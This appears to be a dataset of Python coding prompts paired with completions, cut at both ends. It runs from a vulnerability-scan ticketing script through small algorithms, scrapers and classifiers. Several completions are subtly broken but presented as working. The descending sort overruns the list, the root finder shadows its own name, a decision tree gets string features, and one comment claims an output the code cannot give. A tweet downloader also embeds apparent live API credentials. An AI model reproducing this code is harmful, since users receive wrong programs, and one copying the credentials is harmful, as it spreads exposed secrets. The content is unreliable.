output # checks for a ticket with the exact same \\"subject\\" or \\"short # description\\" on the Redmine system. def CheckTickets(subject): i = 0 project = redmine.project.get(redmine_project) while i < len(project.issues): # print(\\"Checking: \\" + str(project.issues[i])) if str(project.issues[i]) == subject: incident_id = project.issues[i].id opentix_log = csv.reader(open('opentix.csv')) # Generate a dictionary of the known open tickets. This # should really be performed at the beginning so it # doesn't run everytime, but meh! tix_dict = {} for row in opentix_log: tix_dict[row[0]]=row[2] sn_sysid = tix_dict[str(incident_id)] print(\\"Found match: \\" + tix_dict[str(incident_id)] + \\" \\" + str(project.issues[i])) # debug return sn_sysid # return a value for test i += 1 return None # if the test fails, return nothing def log(redmine_issue_id, sn_ticket, sys_id, redmine_url): # Write log file of tickets created ticket_log = open('ticketlog.csv','a') opentix_log = open('opentix.csv','a') ticket_log.write(redmine_issue_id + ',' + sn_ticket + ',' + sys_id + ',' + redmine_url + ',' + 'n') opentix_log.write(redmine_issue_id + ',' + sn_ticket + ',' + sys_id + 'n') ticket_log.close() opentix_log.close() Main program. Extract the data, then call functions # Extract elements from the XML for use in creating the ticket for result in root.findall(\\"./report/results/result\\"): # only process vulnerabilities of a certain severity or higher if result.find('overrides/override/new_severity') is not None: cvss = result.find('overrides/override/new_severity').text else: cvss = result.find('severity').text if float(cvss) >= float(severity_filter): # Extract the elements from the XML host_ip = result.find('host').text severity = result.find('severity').text if result.find('description').text is not None: description = result.find('description').text else: description = \\"no extended description available\\" short_desc = result.find('nvt/name').text cvss = result.find('nvt/cvss_base').text cve = result.find('nvt/cve').text system_type = result.find('nvt/family') # get some additional info based on extracted values hostname = reverse_lookup(host_ip) # perform name lookup impact, urgency, priority = criticality(severity) category, subcategory = categorize(system_type) full_desc = result.find('nvt/tags').text criticality(cvss) # calc criticality levels subject = short_desc + \\" detected on \\" + hostname + \\" \\" + host_ip # Create the body of the ticket by combining multiple elements from # the report file. body = preamble + \\"n n\\" + full_desc + \\"n n CVEs:\\" + cve + \\"n n Description: n\\" + description # Check for currently active ticket for same issue. This previous = CheckTickets(subject) # Create a new ticket if one does not exist. if previous is not None: sn_update(previous, \\"Please provide an update for this ticket\\") else: # create the issues in redmine and return info redmine_url, redmine_issue_id = redmine_issue(priority, subject, body, category) # create the issues in ServiceNow and return info sn_ticket, sys_id = sn_issue(subject, redmine_url, subcategory, impact, urgency) log (redmine_issue_id, sn_ticket, sys_id, redmine_url)"},{"prompt":"Write a Python script to automate a scheduled task Not applicable","completion":"import schedule import time def executeScheduledJob(): # Add your scheduled task code here print(\\"Executing scheduled job...\\") # Add your scheduled task schedule.every().day.at(\\"10:00\\").do(executeScheduledJob) # Run the schedule while True: schedule.run_pending() time.sleep(1)"},{"prompt":"Create a Python program to compute the average of all the numbers in a list. [1, 5, 9.7, 8, 5.6]","completion":"def avg(list): if len(list) == 0: return 0 else: sum = 0 for num in list: sum += num return sum / len(list)"},{"prompt":"Design a program in Python to traverse a matrix. [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"inputMatrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]] #traversing the matrix for row in inputMatrix: for column in row: print(column, end=\\" \\") print()"},{"prompt":"Create an algorithm for sorting a list of integers in descending order in Python. [6, 2, 12, 5]","completion":"def sortDescending(numbers): for i in range(len(numbers)): for j in range(i): if numbers[j] < numbers[j+1]: temp = numbers[j] numbers[j] = numbers[j+1] numbers[j+1] = temp return numbers print(sortDescending([6,2,12,5]))"},{"prompt":"Write a python program to classify a given email as spam or not. Subject: 50% Off Discount!!! Hey there, We are giving away a 50% discount on all our products today only. Hurry up and claim your offer now!","completion":"def is_spam(email): words = [\\"discount\\", \\"offer\\", \\"free\\", \\"cheap\\", \\"50% off\\", \\"purchase now\\"] email_words = email.lower().split() word_list = [word for word in email_words if word in words] if len(word_list) > 0: return 'spam' else: return 'not spam'"},{"prompt":"Create a Python program that takes a given list of numbers and remove any duplicate numbers. sample input: [1, 2, 2, 3, 3, 4]","completion":"def remove_duplicates(arr): result = [] for num in arr: if num not in result: result.append(num) return result # testing arr = [1, 2, 2, 3, 3, 4] print(remove_duplicates(arr)) # Output: [1, 2, 3, 4]"},{"prompt":"Create a Python program to print out the version of the currently installed OS.","completion":"import platform print(platform.platform())"},{"prompt":"Construct a Python program to recursively count down from a given number? num = 5","completion":"def countdown(num): if num == 0: return else: print(num) num -= 1 countdown(num) countdown(5)"},{"prompt":"Create a GUI in Python with two buttons and a label that displays the current time and date.","completion":"import tkinter from tkinter import ttk from datetime import datetime root = tkinter.Tk() root.title = \\"Time and Date\\" # create a label label = ttk.Label(root, text=\\"\\") label.pack() # create two buttons def click_me_1(): result = datetime.now() label.config(text=f\\"Current Time and Date: {result}\\") button_1 = ttk.Button(root, text=\\"Update Date and Time\\", command=click_me_1) button_1.pack() def click_me_2(): result = datetime.now().date() label.config(text=f\\"Today's Date: {result}\\") button_2 = ttk.Button(root, text=\\"Display Date Only\\", command=click_me_2) button_2.pack() root.mainloop()"},{"prompt":"Design a class in Python that calculates the area of a square.","completion":"class Square: def __init__(self, length): self.length = length def find_area(self): return self.length**2 sqr = Square(4) print(sqr.find_area())"},{"prompt":"Design a python program to generate a binary tree","completion":"class Node: def __init__(self, data): self.data = data self.left = None self.right = None class BinaryTree: def __init__(self): self.root = None def insert(self, data): new_node = Node(data) if self.root is None: self.root = new_node else: current = self.root while current is not None: if data < current.data: if current.left is None: current.left = new_node break else: current = current.left elif data > current.data: if current.right is None: current.right = new_node break else: current = current.right"},{"prompt":"Write a Python program to generate a JSON string of five popular dog breeds.","completion":"import json dog_breeds = { \\"Labrador Retriever\\": { \\"Origin\\": \\"United Kingdom\\", \\"Temperament\\": \\"Friendly\\", \\"Life Expectancy\\": \\"12-13 years\\" }, \\"French Bulldog\\": { \\"Origin\\": \\"France\\", \\"Temperament\\": \\"Adaptable\\", \\"Life Expectancy\\": \\"10-12 years\\" }, \\"Siberian Husky\\": { \\"Origin\\": \\"Russia\\", \\"Temperament\\": \\"Outgoing, Cheerful\\", \\"Life Expectancy\\": \\"12-14 years\\" }, \\"Pug\\": { \\"Origin\\": \\"China\\", \\"Temperament\\": \\"Playful, Charming\\", \\"Life Expectancy\\": \\"12-15 years\\" }, \\"Bulldog\\": { \\"Origin\\": \\"England\\", \\"Temperament\\": \\"Friendly\\", \\"Life Expectancy\\": \\"10-12 years\\" } } print(json.dumps(dog_breeds, indent=4))"},{"prompt":"Create a python program that takes two numbers as input, and outputs the result of multiplying them. 3 and 5","completion":"def multiply(a, b): return a * b ans = multiply(3, 5) print(ans) # 15"},{"prompt":"Develop a web crawler in Python to scrape all headlines from a given news website","completion":"import requests from bs4 import BeautifulSoup def crawl_headlines(url): code = requests.get(url) plain = code.text soup = BeautifulSoup(plain, \\"html.parser\\") headlines = [] for headline in soup.find_all('a', {'class': 'story-link'}): headlines.append(headline.string) return headlines URL = \\"https://www.example.com/news\\" headlines = crawl_headlines(URL) print(\\"Headlines:n\\") for headline in headlines: print(headline)"},{"prompt":"Download tweets from a list of users and save them to a CSV file. 1. Install tweepy and unicodecsv libraries in Python. 2. Create a file named users.txt and add the list of users whose tweets you want to download. 3. Run the Python script with the following command: python script.py [maxTweets] [fName] [sinceId] [last_id] 4. Replace [maxTweets] with the maximum number of tweets you want to download. 5. Replace [fName] with the name of the CSV file where you want to save the tweets. 6. Replace [sinceId] and [last_id] with the tweet IDs if you want to download tweets between a specific range. Otherwise, use 1 for both. 7. Wait for the script to finish downloading the tweets and saving them to the CSV file.","completion":"#!/usr/bin/python import tweepy import sys import os import codecs import unicodecsv as csv # API and ACCESS KEYS API_KEY = 'jz3feMK2gN0kaN377FsTXY7uY' API_SECRET = 'sGfCEayfwORloC9SvHy6BmDjifUsUEIF0EF51SgiYUgs054n7H' # Don't buffer stdout, so we can tail the log output redirected to a file sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0) # Max Tweets maxTweets = int(sys.argv[1]) # Filename fName = sys.argv[2] tweetsPerQry = 200 # List of users read from users.txt users = [] #open users.txt file and gets the list of users with open('users.txt', 'r') as f: for line in f: users.append(line.strip()) sinceId = None if(len(sys.argv) > 3): if(sys.argv[3] != '-1'): sinceId = sys.argv[3] last_id = -1L if(len(sys.argv) > 4): last_id = long(sys.argv[4]) def getHashtags(hashes): hashStr = '' for i, h in enumerate(hashes): if i == len(hashes)-1: hashStr = hashStr + h['text'] else: hashStr = hashStr + h['text'] + ',' return hashStr def getMentions(mentions): mentionStr = '' for i, m in enumerate(mentions): if i == len(mentions)-1: mentionStr = mentionStr + m['screen_name'] else: mentionStr = mentionStr + m['screen_name'] + ',' return mentionStr auth = tweepy.AppAuthHandler(API_KEY, API_SECRET) api = tweepy.API(auth, wait_on_rate_limit=True, wait_on_rate_limit_notify=True) if (not api): print (\\"Can't Authenticate Bye!\\") sys.exit(-1) tweetCount = 0 print(\\"Downloading max {0} tweets\\".format(maxTweets)) with open(fName, 'ab') as f: writer = csv.writer(f, encoding='utf-8') writer.writerow(['Username','Created_at','ID','Tweet','RetweetCount','Name','Location','URL','Description','TweetCount','FollowersCount','FriendsCount','hashtags','mentions']) for user in users: tweetCount = 0 last_id = 0 while tweetCount < maxTweets: print 'User is ' + user + ' Tweet count ' + str(tweetCount) + ' max Tweets ' + str(maxTweets) + ' SinceId ' + str(sinceId) + ' last_id ' + str(last_id) try: if (last_id <= 0): if (not sinceId): new_tweets = api.user_timeline(screen_name=user, count=tweetsPerQry) else: new_tweets = api.user_timeline(screen_name=user, count=tweetsPerQry, since_id=sinceId) else: if (not sinceId): new_tweets = api.user_timeline(screen_name=user, count=tweetsPerQry, max_id=str(last_id - 1)) else: new_tweets = api.user_timeline(screen_name=user, count=tweetsPerQry, max_id=str(last_id - 1), since_id=sinceId) if not new_tweets: print(\\"No more tweets found\\") break for tweet in new_tweets: try: hashTags = getHashtags(tweet.entities.get('hashtags')) mentions = getMentions(tweet.entities.get('user_mentions')) writer.writerow([tweet.user.screen_name,tweet.created_at,tweet.id_str,tweet.text,str(tweet.retweet_count),tweet.user.name, tweet.user.location, str(tweet.user.url),tweet.user.description,str(tweet.user.statuses_count),str(tweet.user.followers_count),str(tweet.user.friends_count),hashTags,mentions]) except tweepy.TweepError as e: print(\\"some error : \\" + str(e) + \\" for user: \\" + user) break tweetCount += len(new_tweets) print(\\"Downloaded {0} tweets\\".format(tweetCount)) last_id = new_tweets[-1].id except tweepy.TweepError as e: # Just exit if any error print(\\"some error : \\" + str(e)) break print (\\"Downloaded {0} tweets, Saved to {1}\\".format(tweetCount, fName))"},{"prompt":"Given the following input JSON data, write a Python program to print out all the elements that have an even length. Input data:{apple:[red,green],pear:[green],grapes:[green,red],banana:[yellow]}","completion":"import json data = '{\\"apple\\":[\\"red\\",\\"green\\"],\\"pear\\":[\\"green\\"],\\"grapes\\":[\\"green\\",\\"red\\"],\\"banana\\":[\\"yellow\\"]}' json_data = json.loads(data) for item in json_data.items(): if len(item[1]) % 2 == 0: print(item[0])"},{"prompt":"Create a class in Python to represent books.","completion":"class Book: def __init__(self, title, author, year, isbn): self.title = title self.author = author self.year = year self.isbn = isbn def __str__(self): return '{} by {} published in {}. ISBN: {}'.format(self.title, self.author, self.year, self.isbn)"},{"prompt":"Create a program using Python to generate a random list of numbers between 1 and 100 with seven entries.","completion":"import random # function to generate and # print a random list of 7 numbers # between 1 to 100 def randomList(): randomNumbers = random.sample(range(1, 100), 7) print (\\"Random List is : \\", end=\\"\\") for num in randomNumbers: print (num, end = \\" \\") randomList()"},{"prompt":"Write a matrix multiplication algorithm in Python using twodimensional lists. Not applicable","completion":"def matrix_mul(A,B): if len(A[0]) != len(B): raise ValueError('The column of matrix A must be equal to the row of matrix B') # Create the result matrix C C = [[sum(A[i][k] * B[k][j] for k in range(len(B))) for j in range(len(B[0]))] for i in range(len(A))] return C A = [[1,2], [3,4]] B = [[5,6], [7,8]] product = matrix_mul(A,B) print(product)"},{"prompt":"mplement a naive bayes classifier in Python.","completion":"class NaiveBayesClassifier: \\"\\"\\" A simple Naive Bayes classifier implementation \\"\\"\\" def __init__(self): self.classes = [] self.word_counts = {} self.priors = {} def fit(self, X, y): \\"\\"\\" Train the classifier X: List of documents y: List of labels \\"\\"\\" # compute class priors self.classes = list(set(y)) for c in self.classes: self.priors[c] = (y.count(c) / len(y)) # compute count of words for x, c in zip(X, y): words = x.split() for word in words: if (c, word) not in self.word_counts: self.word_counts[(c, word)] = 0 self.word_counts[(c, word)] += 1 def predict(self, X): \\"\\"\\" Predict classes for a list of documents X: List of documents \\"\\"\\" pred_y = [] for x in X: pred_classes = [] # compute posterior for each class for c in self.classes: posterior = self.priors[c] for word in x.split(): if (c, word) not in self.word_counts: count = 0 else: count = self.word_counts[(c, word)] posterior *= (count + 1) / (sum([self.word_counts[(c, w)] for w in self.word_counts if w[0] == c]) + len(self.word_counts)) pred_classes.append((c, posterior)) # select the most probable class p = max(pred_classes, key=lambda x: x[1]) pred_y.append(p[0]) return pred_y"},{"prompt":"Write a Python program to calculate the sum of the digits of a given number.","completion":"def sum_of_digits(n): sum = 0 # Separate the digits of the number while n > 0: digit = n % 10 sum += digit n //= 10 return sum"},{"prompt":"Construct an algorithm in Python to find the fourth root of a given number. Number: 625","completion":"# Function to calculate \\"nth\\" root of a number def root(number, root): # Choose a initial # approximation (smaller # than the result) x = 0.001 # Increment x by 1 until # \\"x ^ root\\" is less # than or equal to the number while abs(x ** root - number) > 0.001: x += 1 return x # Driver Code number = 625 root = 4 fourthRoot = root(number, root) print(\\"Fourth root of\\", number, \\"is\\", fourthRoot)"},{"prompt":"Design a class in Python that represents a complex number.","completion":"class ComplexNumber: def __init__(self, realpart, imagpart): self.realpart = realpart self.imagpart = imagpart def __add__(self, other): newRealPart = self.realpart + other.realpart newImagPart = self.imagpart + other.imagpart return ComplexNumber(newRealPart, newImagPart) def __sub__(self, other): newRealPart = self.realpart - other.realpart newImagPart = self.imagpart - other.imagpart return ComplexNumber(newRealPart, newImagPart) def __str__(self): return '{} + {}i'.format(self.realpart, self.imagpart)"},{"prompt":"mplement an algorithm in Python to sort a list of integers. List: [3, 9, 8, 5, 6, 4, 2, 1, 10, 7]","completion":"def sort(arr): for i in range(len(arr)): min_idx = i for j in range(i+1, len(arr)): if arr[min_idx] > arr[j]: min_idx = j arr[i], arr[min_idx] = arr[min_idx], arr[i] list = [3, 9, 8, 5, 6, 4, 2, 1, 10, 7] sort(list) print(list) # [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]"},{"prompt":"This code generates tags for a Jekyll blog hosted by Github page. To use it, create a Python file and copy the code into it. Then run the file to generate the tags.","completion":"#!/usr/bin/env python ''' tag_generator.py Copyright 2017 Long Qian Contact: lqian8@jhu.edu This script creates tags for your Jekyll blog hosted by Github page. No plugins required. ''' import glob import os import re post_dir = '_posts/' tag_dir = 'tag/' filenames = glob.glob(post_dir + '*') total_tags = [] for filename in filenames: f = open(filename, 'r') crawl = False for line in f: if crawl: current_tags = line.strip().split() if current_tags[0] == 'tags:': total_tags.extend(current_tags[1:]) crawl = False break if line.strip() == '---': if not crawl: crawl = True else: crawl = False break f.close() total_tags = set(total_tags) old_tags = glob.glob(tag_dir + '*.md') for tag in old_tags: os.remove(tag) for tag in total_tags: sTag = re.sub(\\"^.\\", \\"\\", tag) tag_filename = tag_dir + sTag.lower().replace('.', '-') + '.md' f = open(tag_filename, 'a') write_str = '---nlayout: tagpagentitle: \\"Tag: ' + tag + '\\"ntag: ' + tag + 'nrobots: noindexnexclude_from_search: truentagline: '\\"Creative Active Individuals can only grow up in a society that emphasizes learning instead of teaching.\\" - Chris Alexander'n---n' f.write(write_str) f.close() print(\\"Tags generated, count\\", total_tags.__len__())"},{"prompt":"Can you write a Python function to sort the items in a dictionary by their values?","completion":"def sort_dict_by_values(d): sorted_list = sorted(d.items(), key=lambda item: item[1]) return sorted_list"},{"prompt":"Create a multidimensional array containing 3 rows and 3 columns in python","completion":"arr = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]"},{"prompt":"Use a Python list comprehension to generate a new list which contains only even numbers in the number range from 1 to 10.","completion":"even_numbers = [x for x in range(1, 11) if x % 2 == 0]"},{"prompt":"Generate a Python program to generate a random name with the given initials. Initials: ABC","completion":"\\"\\"\\" Generate a Python program to generate a random name with the given initials import random def generate_name(initials): # Create a list of vowels vowels = ['a', 'e', 'i', 'o', 'u'] # Create a list of consonants consonants = [chr(i) for i in range(ord('a'), ord('z')) if chr(i) not in vowels] name = '' # Iterate through the initials for initial in initials.lower(): # Get a random consonant for each initial if initial in consonants: name += random.choice(consonants) # Get a random vowel for each initial elif initial in vowels: name += random.choice(vowels) # Return the random name return name if __name__ == '__main__': initials = \\"ABC\\" print(generate_name(initials)) \\"\\"\\""},{"prompt":"Create a Python program that uses a decision tree classifier to predict whether a patient has a medical condition or not. The program should be able to print the accuracy of the model and identify which features are important in predicting the outcome. A dataset containing medical records of 1000 patie","completion":"# import libraries import pandas as pd from sklearn import tree from sklearn.metrics import accuracy_score from sklearn.model_selection import train_test_split # load the dataset df = pd.read_csv('data.csv') # separate the feature columns from the target column X = df.drop('medical_condition', axis=1) y = df['medical_condition'] # split the data into train and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.20, random_state=0) # build the decision tree model clf = tree.DecisionTreeClassifier() clf.fit(X_train, y_train) # predict on the test set predictions = clf.predict(X_test) # calculate accuracy accuracy = accuracy_score(y_test, predictions) # print accuracy and feature importance print('Model accuracy is: ', accuracy) print('Feature importance is: ', clf.feature_importances_)"},{"prompt":"Generate a web scraper using Python to extract all internal links from a website. Not applicable","completion":"import requests from bs4 import BeautifulSoup def scrape_links(url): r = requests.get(url) soup = BeautifulSoup(r.content, 'html.parser') links = [a.attrs.get('href') for a in soup.find_all('a')] return [link for link in links if link is not None] if __name__ == '__main__': url = 'https://example.com' links = scrape_links(url) print(links)"},{"prompt":"Write a Python program to get the latest news article from a news website. Not applicable","completion":"import requests from bs4 import BeautifulSoup url = 'https://example.com/news' response = requests.get(url) soup = BeautifulSoup(response.content, 'lxml') latest_news = soup.find('div', id='latest_news') latest_article = latest_news.find('h2') print(latest_article.text)"},{"prompt":"Generate an algorithm in Python to return the common elements in two unsorted arrays. A = [2, 3, 5, 7, 8] B = [3, 5, 7, 9, 10]","completion":"def commonElements(A, B): commonElements = [] for i in A: if i in B and i not in commonElements: commonElements.append(i) return commonElements A = [2, 3, 5, 7, 8] B = [3, 5, 7, 9, 10] print(commonElements(A, B)) # Output: [3, 5, 7]"},{"prompt":"To test the installation of our library, run the \`test_install\` and \`test_sdist\` methods in the \`TestInstallation\` class. The \`test_install\` method installs the library using \`python setup.py install\` and checks that it can be used. The \`test_sdist\` method creates a source distribution tarball with \`python setup.py sdist\` and checks that it matches the content of our git repository. To run the tests, execute the \`unittest\` module on the file containing this code.","completion":"\\"\\"\\" Tests installation of our library. \\"\\"\\" import glob import os import shutil import sys import tarfile import threading import unittest import stem import stem.util.system import test.util from test.util import only_run_once INSTALL_MISMATCH_MSG = \\"Running 'python setup.py sdist' doesn't match our git contents in the following way. The manifest in our setup.py may need to be updated...nn\\" BASE_INSTALL_PATH = '/tmp/stem_test' DIST_PATH = os.path.join(test.util.STEM_BASE, 'dist') SETUP_THREAD, INSTALL_FAILURE, INSTALL_PATH, SDIST_FAILURE = None, None, None, None def setup(): \\"\\"\\" Performs setup our tests will need. This mostly just needs disk iops so it can happen asynchronously with other tests. \\"\\"\\" global SETUP_THREAD def _setup(): global INSTALL_FAILURE, INSTALL_PATH, SDIST_FAILURE original_cwd = os.getcwd() try: os.chdir(test.util.STEM_BASE) try: os.chdir(test.util.STEM_BASE) stem.util.system.call('%s setup.py install --prefix %s' % (sys.executable, BASE_INSTALL_PATH), timeout = 60) stem.util.system.call('%s setup.py clean --all' % sys.executable, timeout = 60) # tidy up the build directory site_packages_paths = glob.glob('%s/lib*/*/site-packages' % BASE_INSTALL_PATH) if len(site_packages_paths) != 1: raise AssertionError('We should only have a single site-packages directory, but instead had: %s' % site_packages_paths) INSTALL_PATH = site_packages_paths[0] except Exception as exc: INSTALL_FAILURE = AssertionError(\\"Unable to install with 'python setup.py install': %s\\" % exc) if not os.path.exists(DIST_PATH): try: stem.util.system.call('%s setup.py sdist' % sys.executable, timeout = 60) except Exception as exc: SDIST_FAILURE = exc else: SDIST_FAILURE = AssertionError(\\"%s already exists, maybe you manually ran 'python setup.py sdist'?\\" % DIST_PATH) finally: os.chdir(original_cwd) if SETUP_THREAD is None: SETUP_THREAD = threading.Thread(target = _setup) SETUP_THREAD.start() return SETUP_THREAD def clean(): if os.path.exists(BASE_INSTALL_PATH): shutil.rmtree(BASE_INSTALL_PATH) if os.path.exists(DIST_PATH): shutil.rmtree(DIST_PATH) def _assert_has_all_files(path): \\"\\"\\" Check that all the files in the stem directory are present in the installation. This is a very common gotcha since our setup.py requires us to remember to add new modules and non-source files. :raises: **AssertionError** files don't match our content \\"\\"\\" expected, installed = set(), set() for root, dirnames, filenames in os.walk(os.path.join(test.util.STEM_BASE, 'stem')): for filename in filenames: file_format = filename.split('.')[-1] if file_format not in test.util.IGNORED_FILE_TYPES: expected.add(os.path.join(root, filename)[len(test.util.STEM_BASE) + 1:]) for root, dirnames, filenames in os.walk(path): for filename in filenames: if not filename.endswith('.pyc') and not filename.endswith('egg-info'): installed.add(os.path.join(root, filename)[len(path) + 1:]) missing = expected.difference(installed) extra = installed.difference(expected) if missing: raise AssertionError(\\"The following files were expected to be in our installation but weren't. Maybe our setup.py needs to be updated?nn%s\\" % 'n'.join(missing)) elif extra: raise AssertionError(\\"The following files weren't expected to be in our installation.nn%s\\" % 'n'.join(extra)) class TestInstallation(unittest.TestCase): @only_run_once def test_install(self): \\"\\"\\" Installs with 'python setup.py install' and checks we can use what we install. \\"\\"\\" if not INSTALL_PATH: setup().join() if INSTALL_FAILURE: raise INSTALL_FAILURE self.assertEqual(stem.__version__, stem.util.system.call([sys.executable, '-c', \\"import sys;sys.path.insert(0, '%s');import stem;print(stem.__version__)\\" % INSTALL_PATH])[0]) _assert_has_all_files(INSTALL_PATH) @only_run_once def test_sdist(self): \\"\\"\\" Creates a source distribution tarball with 'python setup.py sdist' and checks that it matches the content of our git repository. This primarily is meant to test that our MANIFEST.in is up to date. \\"\\"\\" if not stem.util.system.is_available('git'): self.skipTest('(git unavailable)') return setup().join() if SDIST_FAILURE: raise SDIST_FAILURE git_contents = [line.split()[-1] for line in stem.util.system.call('git ls-tree --full-tree -r HEAD')] # tarball has a prefix 'stem-[verion]' directory so stipping that out dist_tar = tarfile.open(os.path.join(DIST_PATH, 'stem-dry-run-%s.tar.gz' % stem.__version__)) tar_contents = ['/'.join(info.name.split('/')[1:]) for info in dist_tar.getmembers() if info.isfile()] issues = [] for path in git_contents: if path not in tar_contents and path not in ['.gitignore']: issues.append(' * %s is missing from our release tarball' % path) for path in tar_contents: if path not in git_contents and path not in ['MANIFEST.in', 'PKG-INFO']: issues.append(\\" * %s isn't expected in our release tarball\\" % path) if issues: self.fail(INSTALL_MISMATCH_MSG + 'n'.join(issues))"},{"prompt":"Generate a piece of code to demonstrate the usage of for loop in python.","completion":"for i in range(10): print('The value of the variable i is: ', i)"},{"prompt":"mplement a decision tree classifier in Python to predict car prices. [Number_of_Doors, Vehicle_Size, Price] [2, Small, 12000] [4, Small, 18000] [4, Large, 20000] [4, Small, 25000]","completion":"import pandas as pd from sklearn import tree # Dataset data = [[2, 'Small', 12000], [4, 'Small', 18000], [4, 'Large', 20000], [4, 'Small', 25000]] # Columns Headers columns= ['Number_of_Doors', 'Vehicle_size', 'Price'] # Create Dataframe df = pd.DataFrame(data, columns=columns) # Create Features X = df.iloc[:, :2].values y = df.Price # Create Decision Tree Classifier clf = tree.DecisionTreeClassifier().fit(X,y) # Making Predictions test_data = [[2, 'Small']] test_data_df = pd.DataFrame(test_data, columns=['Number_of_Doors', 'Vehicle_size']) result = clf.predict(test_data_df) print(result[0])"},{"prompt":"Train a Python model to predict whether a given sentence is positive or negative.","completion":"\\"\\"\\" Building a Python model to predict whether a given sentence is positive or negative. \\"\\"\\" import numpy as np import pandas as pd from sklearn.feature_extraction.text import CountVectorizer from sklearn.model_selection import train_test_split from sklearn.naive_bayes import MultinomialNB def sentiment_model(sentences): # Read in data data = pd.DataFrame(sentences, columns=['sentence']) # Convert text data to bag of words vectorizer = CountVectorizer() vectorized_data = vectorizer.fit_transform(data['sentence']) # Split data into train and test sets labels = np.array([1, 0]) X_train, X_test, y_train, y_test = train_test_split(vectorized_data.toarray(), labels, test_size=0.1, random_state=42) # Fit Naive Bayes model clf = MultinomialNB() clf.fit(X_train, y_train) # Make predictions return clf.predict(X_test) if __name__ == '__main__': sentences = <put input here> print(sentiment_model(sentences))"},{"prompt":"Code a solution for creating a function that sorts an array of strings in descending order using Python.","completion":"def sort_array(arr): arr.sort(reverse = True) return arr arr = [\\"Hello\\", \\"World\\", \\"This\\", \\"is\\", \\"a\\", \\"Test\\"] print(sort_array(arr))"},{"prompt":"Write a python code to calculate the total cost of a grocery bill. items=[(apple, 2.50), (banana, 3.00), (avocado, 1.80)]","completion":"def total_cost(items): total = 0 for item, price in items: total += price return total if __name__ == '__main__': output = total_cost([(\\"apple\\", 2.50), (\\"banana\\", 3.00), (\\"avocado\\", 1.80)]) print(output)"},{"prompt":"Construct an Nary tree to represent a directory structure.","completion":"An N-ary tree can be constructed using programming languages such as Python, JavaScript, etc. It will contain code to create nodes and connect them in the form of a tree structure using references/pointers."},{"prompt":"Write a Python program that converts an input string into its Base 64 representation. Welcome to the world of programming!","completion":"import base64 def str_to_base64(in_str): \\"\\"\\"Converts a given string into its Base 64 representation. Args: in_str (str): The string to convert. Returns: str: The Base 64 representation of the string. \\"\\"\\" encoded_str = base64.b64encode(in_str.encode(\\"utf-8\\")) return encoded_str.decode(\\"utf-8\\") in_str = 'Welcome to the world of programming!' encoded_str = str_to_base64(in_str) print(encoded_str) # V2VsY29tZSB0byB0aGUgd29ybGQgb2YgcHJvZ3JhbW1pbmch"},{"prompt":"Generate code for a linked list in Python","completion":"class ListNode(object): def __init__(self, val=0, next=None): self.val = val self.next = next class Solution: def print_linkedlist(self, head): while head.next != None: head = head.next print(head.val)"},{"prompt":"Code an algorithm in Python that takes in a linked list and splits it into two halves.","completion":"# Defining a Node class Node: def __init__(self, data): self.data = data self.next = None def splitList(head): # Base case if head == None or head.next == None: return head # Fast and slow pointers fastPtr = head.next slowPtr = head # Advancing the fastPtr twice and slowPtr once while(fastPtr != None): fastPtr = fastPtr.next if fastPtr != None: slowPtr = slowPtr.next fastPtr = fastPtr.next # Splitting the linked list in half fastPtr = slowPtr.next slowPtr.next = None return head, fastPtr"},{"prompt":"Construct a python program to sort a given array of strings using quicksort algorithm.","completion":"def partition(arr,low,high): i = (low - 1) pivot = arr[high] for j in range(low , high): if arr[j] <= pivot: i = i+1 arr[i],arr[j] = arr[j],arr[i] arr[i+1],arr[high] = arr[high],arr[i+1] return (i+1) def quicksort(arr,low,high): if low < high: pi = partition(arr,low,high) quicksort(arr, low, pi-1) quicksort(arr, pi+1, high)"},{"prompt":"Write a Python program that finds the average of three numbers. 21, 15, 10","completion":"def avg(a, b, c): return (a + b + c)/3 a = 21 b = 15 c = 10 average = avg(a, b, c) print(\\"Average of three numbers is:\\", average)"},{"prompt":"Create a web scraper in Python to collect data from Amazon. The script should extract product category, title, price, and rating from the Amazon home page. Not applicable","completion":"from bs4 import BeautifulSoup import requests # specify url url = 'https://www.amazon.com/' # query the website and return the html to the variable 'page' page = requests.get(url) # parse the html using beautiful soup and store in variable \`soup\` soup = BeautifulSoup(page.content, 'html.parser') # select all products products = soup.find_all(class_='s-result-item') # iterate through each product for product in products: category = product.find('h3').text title = product.find(attrs={'class':'a-size-medium a-color-base a-text-normal'}).text price = product.find(attrs={'class':'a-price-whole'}).text rating = product.find(attrs={'class':'a-icon-alt'}).text # print results print('Category:', category); print('Title:', title); print('Price:', price); print('Rating:', rating);"},{"prompt":"Create a Python program to search through a list of given strings and return the substrings that start with the same letter. strings = ['apple', 'mango', 'carrot', 'dog']","completion":"def find_same_letter_substrings(strings): result = [] for string in strings: if string[0] in [x[0] for x in strings if x != string]: result.append(string) return result if __name__ == '__main__': strings = ['apple', 'mango', 'carrot', 'dog'] print(find_same_letter_substrings(strings)) # Result: ['apple', 'mango', 'carrot']"},{"prompt":"Generate a new Python class which extends some existing class, but with a modified constructor. class A: def __init__(self, param1, param2): self.param1 = param1 self.param2 = param2","completion":"class B(A): def __init__(self, param1, param2, param3): super().__init__(param1, param2) self.param3 = param3"},{"prompt":"Create a sorting algorithm in Python that sorts a list of numbers from smallest to largest. [5, 4, 3, 2, 1]","completion":"def sort_nums(nums): for i in range(len(nums)): for j in range(len(nums)-i-1): if nums[j] > nums[j+1]: nums[j], nums[j+1] = nums[j+1], nums[j] return nums"},{"prompt":"Formulate a regular expression in Python that matches words that starts with any two letters followed by two digits.","completion":"regex = r\\"^[a-zA-Z]{2}d{2}\\""},{"prompt":"Write a Python program to remove duplication of characters in a string.","completion":"def remove_duplicates_from_string(string): '''This function will remove duplicates of characters in a given string''' result = '' for char in string: if char not in result: result += char return result # Example print(remove_duplicates_from_string('hello world!')) # Output: # helo wrd!"},{"prompt":"Develop a python function to locate a specific element in an array [6, 2, 4, 8], 8","completion":"def find_element(arr, target): for i in range(len(arr)): if arr[i] == target: return i return -1"},{"prompt":"This code defines a Python class called techsupport_args that provides additional arguments for fetching the techsupport resource. The class has a property called scope that can be set to either NODE or CLUSTER to specify whether to run showtechsupport on the present node or all cluster nodes. To use this class, create an instance of it and set the scope property as desired.","completion":"# # Copyright (c) 2008-2015 Citrix Systems, Inc. # # Licensed under the Apache License, Version 